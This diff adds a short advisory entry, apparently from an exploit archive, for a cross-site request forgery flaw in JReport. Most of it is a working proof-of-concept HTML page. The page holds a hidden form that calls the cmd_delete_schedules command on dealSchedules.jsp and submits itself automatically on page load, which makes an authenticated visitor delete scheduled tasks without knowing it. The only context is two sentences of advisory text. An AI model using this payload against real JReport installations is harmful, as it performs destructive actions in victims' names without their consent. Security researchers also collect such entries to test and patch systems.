@@ -1,0 +1,20 @@
+source: http://www.securityfocus.com/bid/63363/info
+
+JReport is prone to a cross-site request-forgery vulnerability.
+
+Exploiting this issue may allow a remote attacker to perform certain unauthorized actions. This may lead to further attacks. 
+
+<html>
+<body>
+<form name="foo" action="https://www.example.com/jreport/jinfonet/dealSchedules.jsp"method="post">
+<input type=hidden name="d1" value="2013-08-03%252014%253a20%253a41.29">
+<input type=hidden name="cmd" value="cmd_delete_schedules">
+<input type=hidden name="taskClass" value="APIDemoDynamicExportTask">
+<input type=hidden name="taskUrl" value="schedulePage.jsp%3Fjrs.cmd%3Djrs.get_edit_schd_page%26jrs.task_id%3D2013-08-03%252014%253a20%253a41.29%26jrs.catalog%3D%252fSecurity%252fSecurity.cat%26jrs.report%3D%252fSecurity%252fBank_User%2520Activation.cls%26jrs.path%3D%2FUSERFOLDERPATH%2Fadmin">
+<input type=hidden name="jrs.path" value="%2FUSERFOLDERPATH%2Fadmin">
+</form>
+<script>
+document.foo.submit();
+</script>
+</body>
+</html>
